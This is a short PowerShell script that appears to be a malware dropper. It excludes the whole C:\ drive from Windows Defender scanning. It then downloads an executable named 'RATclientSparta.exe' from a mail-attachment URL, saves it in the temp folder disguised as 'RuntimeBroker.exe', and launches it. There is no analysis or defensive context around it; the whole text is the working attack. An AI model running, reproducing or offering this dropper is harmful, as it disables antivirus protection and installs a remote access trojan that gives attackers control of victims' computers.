Add-MpPreference -ExclusionPath C:\

$url = "https://mail.yandex.com/message_part/RATclientSparta.exe?_uid=2056574274&name=RATclientSparta.exe&hid=1.2&ids=188025284442718212"

$output = "$env:Temp/RuntimeBroker.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output
